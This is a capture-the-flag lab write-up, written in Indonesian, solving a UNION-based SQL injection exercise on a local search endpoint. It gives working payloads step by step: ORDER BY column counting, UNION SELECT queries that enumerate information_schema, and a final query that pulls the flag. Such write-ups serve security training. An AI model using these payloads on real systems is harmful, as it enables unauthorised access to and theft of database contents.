# Lab E1 - UNION Based SQL Injection (Easy)

## Informasi Lab
- **Endpoint**: `/search.php?q=`
- **Tipe**: UNION Based Injection
- **Hint**: HTML comment di source code

## Analisis

### 1. Identifikasi Kerentanan
Akses endpoint dengan parameter biasa:
```
http://localhost/e1/search.php?q=laptop
```

Lihat source HTML, ada comment:
```html
<!-- admin testing parameter q -->
```

### 2. Konfirmasi SQL Injection
Test dengan single quote:
```
http://localhost/e1/search.php?q=laptop'
```
Jika muncul error atau hasil berubah, berarti vulnerable.

### 3. Tentukan Jumlah Kolom
Gunakan ORDER BY:
```
?q=laptop' ORDER BY 1-- -
?q=laptop' ORDER BY 2-- -
?q=laptop' ORDER BY 3-- -
?q=laptop' ORDER BY 4-- -  (error = hanya 3 kolom)
```

### 4. UNION Injection
```
?q=laptop' UNION SELECT 1,2,3-- -
```
Lihat angka mana yang tampil di halaman.

### 5. Ekstrak Database Info
```
?q=laptop' UNION SELECT 1,database(),3-- -
?q=laptop' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
```

### 6. Ekstrak Nama Kolom
```
?q=laptop' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flags'-- -
```

## Solusi

### Payload Final
```
http://localhost/e1/search.php?q=laptop' UNION SELECT 1,flag,3 FROM flags-- -
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```
(Flag berbeda setiap restart container)

## Tools yang Bisa Digunakan
- sqlmap
- Burp Suite
- Manual browser
